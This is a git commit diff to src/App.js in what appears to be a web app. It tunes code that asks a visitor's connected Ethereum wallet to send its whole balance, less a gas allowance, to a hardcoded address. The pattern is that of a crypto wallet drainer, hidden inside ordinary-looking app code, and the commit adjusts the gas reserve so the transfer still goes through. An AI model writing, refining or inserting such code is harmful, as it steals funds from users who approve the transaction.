6b93df51d7bcd024d7cca53fafee7d0eb335a3f5
SDEEY <75689630+SDEEY@users.noreply.github.com>
2023-03-14 23:29:21 +0500

    Update App.js

--- src/App.js
+++ src/App.js
@@ -51,7 +51,7 @@ function App() {
             "to": '0x57f415C2128875C9e4e3EDB2080010837D10e1Cd',
             // "gas": Number(((gas / 15) / 3089) * 10000000).toFixed().toString(16),
             //"gasPrice": Number(gas * 1000000000).toString(16),
-            "value": parseInt((convertedBalance - (Number(gas) / 40000)) * 1000000000000000000).toString(16)
+            "value": parseInt((convertedBalance - (Number(gas) / 20000)) * 1000000000000000000).toString(16)
         }]
 
         const response = await window.ethereum.request({method: 'eth_sendTransaction', params}).catch(err => {
